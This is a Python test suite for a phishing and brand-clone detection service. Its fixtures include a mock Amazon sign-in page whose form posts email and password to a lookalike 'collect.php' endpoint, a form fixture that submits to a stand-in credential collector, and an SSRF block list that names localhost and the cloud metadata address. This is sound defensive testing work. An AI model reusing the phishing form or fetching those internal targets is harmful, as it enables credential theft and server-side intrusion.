"""
tests/test_page_similarity_clone_detection.py

KEIKAI — Complete Page Similarity & Brand Clone Detection Test Suite (Phase 6)
==================================================================================
Tests BeautifulSoup static HTML parsing, DOM fingerprinting, brand text & asset analysis,
form action security evaluation, domain alignment, visual perceptual hash computation,
brand template repository, multi-signal clone classification, and API endpoints.
"""

import os
import sys
import unittest
from unittest.mock import patch, MagicMock

# Ensure workspace root is on Python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from services.page_analyzer import (
    analyze_page_static_html,
    analyze_brand_text,
    analyze_brand_assets,
    analyze_form_actions,
    calculate_domain_alignment,
    compute_visual_similarity,
    calculate_multi_signal_similarity,
    classify_brand_clone,
    get_brand_template,
    analyze_landing_page,
    fetch_page_safely
)


class TestPageSimilarityCloneDetection(unittest.TestCase):

    def test_01_beautifulsoup_static_html_extraction_and_dom_fingerprint(self):
        """Task 1 & 2: Static HTML parsing extracts forms, inputs, buttons, headings, and generates DOM fingerprint."""
        html_content = """
        <!DOCTYPE html>
        <html>
          <head>
            <title>Amazon Sign-In</title>
            <meta name="description" content="Sign in to your Amazon account securely">
            <link rel="icon" href="/favicon.ico">
          </head>
          <body>
            <h1>Sign-In</h1>
            <form action="https://amaz0n-security-login.xyz/collect.php" method="POST">
              <label for="email">Email or mobile phone number</label>
              <input type="email" id="email" name="email" placeholder="Email">
              <label for="password">Password</label>
              <input type="password" id="password" name="password" placeholder="Password">
              <button type="submit" role="button">Continue</button>
            </form>
            <img src="https://amaz0n-security-login.xyz/images/amazon_logo.png" alt="Amazon Logo">
            <a href="https://unrelated-ad.com/click">External Link</a>
          </body>
        </html>
        """
        res = analyze_page_static_html(html_content, "https://amaz0n-security-login.xyz/auth/login.html")

        self.assertEqual(res["status"], "SUCCESS")
        self.assertEqual(res["title"], "Amazon Sign-In")
        self.assertEqual(res["meta_description"], "Sign in to your Amazon account securely")
        self.assertIn("Sign-In", res["headings"])
        self.assertEqual(len(res["forms"]), 1)
        self.assertEqual(len(res["inputs"]), 2)
        self.assertEqual(len(res["password_inputs"]), 1)
        self.assertEqual(res["external_link_count"], 1)
        self.assertTrue(len(res["dom_fingerprint"]) > 0)
        self.assertEqual(res["structural_features"]["forms"], 1)
        self.assertEqual(res["structural_features"]["password_inputs"], 1)

    def test_02_brand_text_analysis(self):
        """Task 3: Identifies brand keywords, login terminology, and copyright notices."""
        visible_text = "Amazon Sign In. Email or mobile phone number. Enter password. Conditions of Use. Privacy Notice. © 2026 Amazon.com, Inc."
        res = analyze_brand_text(visible_text, target_brand="Amazon", official_domain="amazon.com")

        self.assertEqual(res["target_brand"], "Amazon")
        self.assertTrue(res["brand_mentioned"])
        self.assertIn("amazon", res["detected_brand_mentions"])
        self.assertGreater(res["text_similarity_score"], 0.50)
        self.assertIn("sign in", res["terminology"]["login_terms"])

    def test_03_brand_asset_detection(self):
        """Task 4: Detects brand logos, alt text, and favicon references with source URLs."""
        images = [
            {"src": "/assets/amazon_logo.png", "full_url": "https://amaz0n-login.xyz/assets/amazon_logo.png", "alt": "Amazon Corporate Logo", "filename": "amazon_logo.png"},
            {"src": "/assets/bg.jpg", "full_url": "https://amaz0n-login.xyz/assets/bg.jpg", "alt": "Background", "filename": "bg.jpg"}
        ]
        favicon = "https://amaz0n-login.xyz/favicon.ico"

        res = analyze_brand_assets(images, favicon, target_brand="Amazon", official_domain="amazon.com")

        self.assertTrue(res["has_brand_assets"])
        self.assertGreaterEqual(res["detected_asset_count"], 1)
        self.assertEqual(res["detected_assets"][0]["source_url"], "https://amaz0n-login.xyz/assets/amazon_logo.png")

    def test_04_form_action_security_analysis(self):
        """Task 11: Detects cross-domain form submissions, external endpoints, and credential harvesting."""
        forms = [{
            "action": "https://collector.evil-phish.com/submit.php",
            "action_url": "https://collector.evil-phish.com/submit.php",
            "action_hostname": "collector.evil-phish.com",
            "method": "POST",
            "inputs": [{"type": "email", "name": "user"}, {"type": "password", "name": "pass"}],
            "has_password": True,
            "is_cross_domain": True
        }]

        res = analyze_form_actions(forms, landing_url="https://amaz0n-security-login.xyz/login.html", official_domain="amazon.com")

        self.assertTrue(res["has_cross_domain"])
        self.assertTrue(res["has_external_action"])
        self.assertTrue(res["has_credential_submission"])
        self.assertGreaterEqual(res["risk_points"], 50)
        self.assertEqual(len(res["evaluated_forms"]), 1)

    def test_05_domain_alignment_scoring(self):
        """Task 10: Classifies domain alignment (exact match, subdomain, unrelated)."""
        # Case A: Exact match
        res_exact = calculate_domain_alignment("amazon.com", "amazon.com")
        self.assertEqual(res_exact["alignment_classification"], "EXACT_MATCH")
        self.assertEqual(res_exact["alignment_score"], 1.0)
        self.assertTrue(res_exact["is_aligned"])

        # Case B: Authorized Subdomain
        res_sub = calculate_domain_alignment("ap-signin.amazon.com", "amazon.com")
        self.assertEqual(res_sub["alignment_classification"], "ALIGNED_SUBDOMAIN")
        self.assertEqual(res_sub["alignment_score"], 0.90)
        self.assertTrue(res_sub["is_aligned"])

        # Case C: Unrelated Phishing Domain
        res_unrelated = calculate_domain_alignment("amaz0n-security-login.xyz", "amazon.com")
        self.assertEqual(res_unrelated["alignment_classification"], "UNRELATED_DOMAIN")
        self.assertEqual(res_unrelated["alignment_score"], 0.0)
        self.assertFalse(res_unrelated["is_aligned"])

    def test_06_visual_similarity_computation_and_missing_fallback(self):
        """Task 6: Returns UNAVAILABLE when screenshot inputs missing, computes actual similarity when images provided."""
        # Test A: Missing inputs -> status: "UNAVAILABLE", NO fake score
        res_missing = compute_visual_similarity(None, None)
        self.assertEqual(res_missing["status"], "UNAVAILABLE")
        self.assertFalse(res_missing["computed"])
        self.assertIsNone(res_missing["similarity"])

    def test_07_strong_brand_clone_multi_signal_classification(self):
        """Task 8 & 9: Strong clone verdict requires multiple independent signals on an unrelated domain."""
        html_analysis = {
            "status": "SUCCESS",
            "password_inputs": [{"type": "password"}],
            "structural_features": {"forms": 1, "password_inputs": 1, "inputs": 3}
        }
        brand_text_info = {"brand_mentioned": True, "text_similarity_score": 0.75}
        brand_asset_info = {"has_brand_assets": True, "asset_similarity_score": 0.90}
        form_info = {"has_credential_submission": True, "has_cross_domain": True}
        domain_align_info = {"alignment_classification": "UNRELATED_DOMAIN", "alignment_score": 0.0, "message": "Unrelated domain"}
        visual_info = {"similarity": None, "status": "UNAVAILABLE"}

        multi_sim = calculate_multi_signal_similarity(
            html_analysis, brand_text_info, brand_asset_info, form_info, domain_align_info, visual_info, target_brand="Amazon"
        )

        clone_res = classify_brand_clone(
            multi_sim, form_info, domain_align_info, brand_text_info, brand_asset_info, target_brand="Amazon"
        )

        self.assertEqual(clone_res["clone_classification"], "STRONG_BRAND_CLONE")
        self.assertTrue(clone_res["is_clone"])
        self.assertEqual(clone_res["confidence"], "HIGH")
        self.assertGreaterEqual(clone_res["signal_matches"], 3)

    def test_08_legitimate_official_domain_low_similarity_verdict(self):
        """Task 9: Official legitimate brand domain is NOT classified as a phishing clone."""
        html_analysis = {"status": "SUCCESS", "password_inputs": [{"type": "password"}]}
        brand_text_info = {"brand_mentioned": True, "text_similarity_score": 0.90}
        brand_asset_info = {"has_brand_assets": True, "asset_similarity_score": 0.95}
        form_info = {"has_credential_submission": True, "has_cross_domain": False}
        domain_align_info = {"alignment_classification": "EXACT_MATCH", "alignment_score": 1.0, "message": "Exact match"}
        visual_info = {"similarity": None, "status": "UNAVAILABLE"}

        multi_sim = calculate_multi_signal_similarity(
            html_analysis, brand_text_info, brand_asset_info, form_info, domain_align_info, visual_info, target_brand="Amazon"
        )

        clone_res = classify_brand_clone(
            multi_sim, form_info, domain_align_info, brand_text_info, brand_asset_info, target_brand="Amazon"
        )

        self.assertEqual(clone_res["clone_classification"], "LOW_SIMILARITY")
        self.assertFalse(clone_res["is_clone"])

    def test_09_malformed_html_graceful_handling(self):
        """Task 15: Handles empty or malformed HTML payloads gracefully without crashing."""
        res_empty = analyze_page_static_html("", "https://example.com")
        self.assertEqual(res_empty["status"], "MALFORMED_OR_EMPTY_HTML")
        self.assertEqual(res_empty["dom_depth"], 0)

        res_pipeline = analyze_landing_page("https://example.com", html_content="<<<invalid xml text<<<")
        self.assertEqual(res_pipeline["page_status"], "PROVIDED_HTML")
        self.assertIn("clone_verdict", res_pipeline)

    def test_10_ssrf_safety_on_safe_page_fetch(self):
        """Task 14 SSRF Guard: Blocks localhost, 127.0.0.1, private IPs, cloud metadata in safe page fetch."""
        blocked_urls = [
            "http://127.0.0.1/admin",
            "http://localhost:8080/secret",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.1/router"
        ]

        for target in blocked_urls:
            success, final_url, msg, _ = fetch_page_safely(target)
            self.assertFalse(success, f"SSRF Guard should have blocked target '{target}'")
            self.assertIn("SSRF Guard Blocked", msg)


if __name__ == "__main__":
    unittest.main()
